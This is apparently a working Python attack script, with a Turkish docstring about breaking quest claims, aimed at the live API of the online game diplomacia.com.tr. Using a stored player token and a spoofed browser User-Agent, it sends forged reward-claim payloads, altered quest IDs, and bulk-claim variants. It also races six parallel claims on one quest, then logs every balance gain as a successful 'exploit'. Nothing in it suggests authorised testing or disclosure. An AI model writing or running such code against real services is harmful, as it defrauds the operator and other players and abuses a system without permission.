#!/usr/bin/env python3
"""Quest claim kırma denemeleri — work_1, work_3, race, id fuzz."""
import json
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path

AUTH = Path("/root/diplomacia-auth.json")
BASE = "https://diplomacia.com.tr/api"
OUT = Path(__file__).resolve().parents[1] / "output" / "reverse"
DELAY = 3.0


def load():
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method, path, token, body=None, delay=DELAY):
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://diplomacia.com.tr",
        "Referer": "https://diplomacia.com.tr/",
    }
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    time.sleep(delay)
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read().decode()
            return r.status, json.loads(raw) if raw.startswith("{") else raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:300]}


def balance(token):
    st, d = api("GET", "/players/profile", token)
    return d.get("player", {}).get("balance", 0) if st == 200 else None


def try_claim(token, label, path, body=None):
    b0 = balance(token)
    st, data = api("POST", path, token, body)
    b1 = balance(token)
    delta = (b1 or 0) - (b0 or 0)
    return {"label": label, "path": path, "body": body, "status": st, "delta": delta,
            "response": data, "exploit": delta > 0 and st in (200, 201)}


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    token, my_id = load()
    results = []
    b_start = balance(token)

    st, quests = api("GET", "/quests", token)
    qmap = {q["quest_key"]: q for q in quests.get("quests", [])}
    results.append({"quests_snapshot": quests})

    targets = []
    for key in ("work_1", "work_3", "work_5", "war_contrib_1"):
        if key in qmap:
            targets.append(qmap[key])

    # Standard + fuzz claims
    for q in targets:
        qid = q["id"]
        results.append(try_claim(token, f"claim_uuid_{q['quest_key']}", f"/quests/{qid}/claim", {}))
        results.append(try_claim(token, f"claim_key_{q['quest_key']}", f"/quests/{qid}/claim", {"quest_key": q["quest_key"]}))
        results.append(try_claim(token, f"claim_step_{q['quest_key']}", f"/quests/{qid}/claim", {"step": q["target"]}))
        results.append(try_claim(token, f"claim_force_{q['quest_key']}", f"/quests/{qid}/claim",
                                 {"quest_id": qid, "completed": True, "rewarded": False}))
        # Wrong UUID variants
        fake = qid[:-1] + ("0" if qid[-1] != "0" else "1")
        results.append(try_claim(token, f"claim_fake_{q['quest_key']}", f"/quests/{fake}/claim", {}))

    # Bulk claim attempts
    for body in [
        {"quest_ids": [t["id"] for t in targets]},
        {"claim_all": True},
        {"quest_key": "work_1"},
    ]:
        results.append(try_claim(token, "bulk_claim", "/quests/claim-all", body))

    # Race: parallel claim work_1
    qid = qmap.get("work_1", {}).get("id")
    if qid:
        outs = []
        barrier = threading.Barrier(6)

        def race(i):
            try:
                barrier.wait(timeout=5)
                headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
                req = urllib.request.Request(
                    BASE + f"/quests/{qid}/claim", data=b"{}", headers=headers, method="POST")
                with urllib.request.urlopen(req, timeout=20) as r:
                    outs.append({"t": i, "status": r.status, "body": r.read().decode()[:200]})
            except urllib.error.HTTPError as e:
                outs.append({"t": i, "status": e.code, "body": e.read().decode()[:200]})

        threads = [threading.Thread(target=race, args=(i,)) for i in range(6)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        time.sleep(DELAY)
        b_race = balance(token)
        results.append({"race_claim_work_1": outs, "balance_after_race": b_race, "delta_from_start": b_race - b_start})

    # Re-complete quest via work then claim
    if qmap.get("work_5", {}).get("progress", 0) < 5:
        api("POST", "/auto/use-pills", token, {})
        api("POST", "/factories/work", token, {})
        results.append(try_claim(token, "claim_after_work", f"/quests/{qmap['work_5']['id']}/claim", {}))

    b_end = balance(token)
    exploited = [r for r in results if isinstance(r, dict) and r.get("exploit")]
    report = {
        "run_at": datetime.utcnow().isoformat() + "Z",
        "balance_start": b_start,
        "balance_end": b_end,
        "total_delta": b_end - b_start,
        "exploits": len(exploited),
        "results": results,
    }
    (OUT / "quest_claim_break.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"balance {b_start} -> {b_end} ({b_end-b_start:+d}) exploits={len(exploited)}")
    for r in results:
        if isinstance(r, dict) and r.get("delta", 0) > 0:
            print("💰", r.get("label"), r.get("delta"), r.get("response"))


if __name__ == "__main__":
    main()
